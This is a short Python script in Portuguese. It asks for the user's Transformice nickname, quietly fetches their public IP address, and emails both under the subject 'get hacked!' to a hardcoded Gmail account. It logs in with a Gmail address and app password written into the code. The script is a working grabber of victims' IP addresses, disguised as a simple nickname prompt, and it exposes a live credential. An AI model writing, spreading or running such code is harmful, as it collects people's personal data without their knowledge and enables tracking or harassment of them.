import smtplib
from requests import get
from email.message import EmailMessage

def enviar_email(destinatario, assunto, corpo):
    email = EmailMessage()
    email['From'] = "dreamsapnap73@gmail.com"
    email['To'] = destinatario
    email['Subject'] = assunto
    email.set_content(corpo)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login("dreamsapnap73@gmail.com", "byva dktw qfql bwah")
        smtp.send_message(email)

ip = get('https://api.ipify.org').text

nickname = input("Qual seu nickname no Transformice?\n")

destinatario = "dreamsapnap73@gmail.com"
assunto = f"{nickname} get hacked!"
corpo = f"                                       ....\n                            ...--'''''''     ''''''''''--..\n        ................-'''............................'''''-..................\n        ''-..   ........................       ........................    .-''\n           '.  \      .--''''''-..      /     \       .--'''''-..       l   |\n            '.  \    /           \    /       \    /           \     /   /\n             l   '   \           /    /   /'\  \   \           /    .'  /\n              \  '-.  '-......-''   /   /   \  '-    '-.....-'    ..'   /\n               '-.. ''''''------''  ..-       -..  '''--------''''_.-'\n                l '''''''''-----''''''              ''''''------.''''   |\n                '.          O                         O   '-'    /\n                 '.   O         ('|'''''''''''''''''|')        ..    /\n                   '.              ''\..      .../           ''  .'\n                     '-.                ''''''''               .''\n                        ''-.                            ..-'\n                            '''--....            ...-'''\n                                     ''''''''''''''''\n\nNickname: {nickname}\nIP: {ip}"

enviar_email(destinatario, assunto, corpo)
